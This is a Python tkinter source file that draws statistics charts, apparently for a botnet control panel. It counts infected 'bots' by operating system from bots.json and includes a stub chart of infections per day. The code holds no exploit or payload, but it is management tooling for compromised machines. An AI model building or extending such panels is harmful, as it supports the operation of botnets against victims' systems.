import tkinter as tk
from tkinter import ttk
import json, os, time
from datetime import datetime, timedelta
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
from matplotlib.figure import Figure

class StatsTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.build_ui()

    def build_ui(self):
        self.fig = Figure(figsize=(8, 6), dpi=100)
        self.ax1 = self.fig.add_subplot(211)
        self.ax2 = self.fig.add_subplot(212)
        self.canvas = FigureCanvasTkAgg(self.fig, self)
        self.canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)
        self.update_stats()

    def update_stats(self):
        # Загружаем bots.json и считаем статистику
        bots = []
        if os.path.exists("bots.json"):
            with open("bots.json", 'r') as f:
                try:
                    bots = json.load(f)
                except:
                    pass
        # Распределение по типу ОС
        os_counts = {"linux":0, "windows":0, "iot":0}
        for bot in bots:
            os_type = bot.get('os', 'linux')
            if os_type in os_counts:
                os_counts[os_type] += 1
            else:
                os_counts['linux'] += 1
        self.ax1.clear()
        self.ax1.bar(os_counts.keys(), os_counts.values(), color=['green','blue','red'])
        self.ax1.set_title('Боты по типам ОС')
        self.ax1.set_ylabel('Количество')
        
        # График заражений по дням (заглушка: из файла логов)
        # Здесь можно парсить avz.log, но пока просто демонстрация
        self.ax2.clear()
        self.ax2.set_title('Заражения за последние 7 дней (демо)')
        self.ax2.set_xlabel('День')
        self.ax2.set_ylabel('Ботов')
        self.canvas.draw()
        self.after(60000, self.update_stats)  # обновление раз в минуту
